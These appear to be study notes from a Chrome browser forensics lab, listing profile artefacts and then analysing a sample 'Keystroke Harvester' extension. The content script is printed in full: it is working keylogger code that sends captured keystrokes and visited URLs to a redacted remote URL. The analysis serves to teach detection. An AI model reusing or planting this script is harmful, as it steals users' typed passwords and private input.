Original Notes

Dissecting Browser Artefacts II: Google Chrome

Google Chrome's browsing data are stored in the user's AppData\Local\Google\Chrome\User Data directory. In addition, the default Chrome user profile is stored in the Default directory. Like the previous task, let's enumerate each user directory and see if any Google Chrome artefacts are available using the command below.

powershell
PS C:\Users\Administrator> ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Google\Chrome\User Data\Default" 2>$null | findstr Directory}

From here, we can start analysing the contents of the discovered Chrome metadata directory. Below is the summary of artefacts worth checking for Google Chrome.

File / Directory NameArtefact ContentsFile Type
HistoryContains the browsing history and download metadata.SQLite
Login DataContains credentials saved through the browser.SQLite
ExtensionsThis directory includes all artefacts related to Chrome extensions.Folder (JavaScript and meta files)
CacheThis directory includes cached files stored to optimise the site loading.Folder
SessionsHandles sessions and tabs metadata.Folder
BookmarksHandles bookmark metadata.JSON
Web DataContains input data submitted by the user in web forms.SQLite

The events generated from the metadata are closely similar to the artefacts stored in Firefox. The only difference would be the structure of the SQLite databases and their tables. Nevertheless, the approach discussed in the previous task can still be applied as long as the artefact exists.

Scenario: Malicious Browser Extension

Another good use case for browser forensics is malicious browser extensions. Given this, we will analyse installed Chrome extensions to determine if a malicious one is deployed. To start with, navigate to the Chrome's extensions directory. As you can see, this location contains another set of directories named with the unique identifier of each browser extension.

Administrator: WindowsPowerShell

powershell
PS C:\Users\Administrator> cd 'C:\Users\mike.myers\AppData\Local\Google\Chrome\User Data\Default\Extensions\'
PS C:\Users\mike.myers\AppData\Local\Google\Chrome\User Data\Default\Extensions> ls

    Directory: C:\Users\tryhackme\AppData\Local\Google\Chrome\User Data\Default\Extensions

d-----         3/3/2024   7:11 PM                Temp

Now, navigate to one of the extension directories and open its manifest.json file. This file defines the structure and behaviour of the extension.

Administrator: WindowsPowerShell

powershell
PS C:\Users\mike.myers\AppData\Local\Google\Chrome\User Data\Default\Extensions> cd .\nchfdofnmealimhgfkncdfkionopnanf\1.0_0\

PS C:\Users\mike.myers\AppData\Local\Google\Chrome\User Data\Default\Extensions\nchfdofnmealimhgfkncdfkionopnanf\1.0_0> cat manifest.json
{
   "background": {
      "service_worker": "background.js"
   },
   "content_scripts": [ {
      "js": [ "script.js" ],
      "matches": [ "*://*/*" ]
   } ],
   "description": "Collect and report keystrokes.",
   "icons": {
      "128": "icons/icon128.png",
      "16": "icons/icon16.png",
      "48": "icons/icon48.png"
   },
   "key": "REDACTED",
   "manifest_version": 3,
   "name": "Keystroke Harvester",
   "version": "1.0"
}

PS C:\Users\mike.myers\AppData\Local\Google\Chrome\User Data\Default\Extensions\nchfdofnmealimhgfkncdfkionopnanf\1.0_0> cat .\background.js
chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    sendResponse(request);
  }
);

Based on the file contents, you may already deduce that it is a keystroke harvester, given the name and description. However, let's focus on the underlying scripts that execute while the extension is running in the browser. You may observe two JavaScript files mentioned in the background (background.js) and content_scripts (script.js) fields. Before we open these files, let's discuss first these two fields.

  • background - Defines the service workers (scripts) running in the background.
  • content_scripts - Content scripts are files that are injected into the sites visited. This means that the running scripts can interact with the contents of the site the user visits and execute additional functionalities.

Since the files to be investigated are JavaScript files, it just boils down to conducting a source code review on the files mentioned in the background and content_scripts field. Now, let's check the contents of the background.js file.

powershell
PS C:\Users\mike.myers\AppData\Local\Google\Chrome\User Data\Default\Extensions\nchfdofnmealimhgfkncdfkionopnanf\1.0_0> cat .\background.js
chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    sendResponse(request);
  }
);

Based on the contents, it is just a simple snippet of adding a listener that waits for events sent to the extension and sends back the request to the sender of the data. Given the functionality, it does not seem suspicious since it does not show unusual behaviours, such as connecting to another web server or harvesting information from the website.

Now, let's proceed to the contents of the script.js file.

powershell
PS C:\Users\mike.myers\AppData\Local\Google\Chrome\User Data\Default\Extensions\nchfdofnmealimhgfkncdfkionopnanf\1.0_0> cat .\script.js
var keys = '';
var current = document.URL;

var xhr = new XMLHttpRequest();
xhr.open("POST", "REDACTED_URL", true);
xhr.setRequestHeader('Content-Type', 'application/json');
const json = {
    "logged": current,
};
xhr.send(JSON.stringify(json));

document.onkeydown = function (e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function () {
    if (keys != "") {
        var xhr_key = new XMLHttpRequest();
        xhr_key.open("POST", "REDACTED_URL", true);
        xhr_key.setRequestHeader('Content-Type', 'application/json');
        const json_key = {
            "logged": keys,
        };
        xhr_key.send(JSON.stringify(json_key));
        keys = "";
    }
}, REDACTED);

Based on the contents, you will already observe the following:

  • The script connects to a domain via a POST request (via XMLHttpRequest's open and send functions).
  • The first POST request contains the current site's URL.
  • The script also collects keystrokes using the document.onkeydown function and stores them in the keys variable.
  • The script sends a POST request containing the collected keystrokes from the keys variable in a fixed interval (setInterval function).

Given these observations, we can say that the behaviour of this Chrome extension is malicious and conclude that it should be removed from the browser, and the malicious domain found in the script should be blocked.

Compared to other known malicious extensions deployed in the wild, the sample Chrome extension we investigated is still simple. This is because the javascript code is not obfuscated. In more advanced cases, javascript deobfuscation is needed to understand the code and determine if it is malicious.
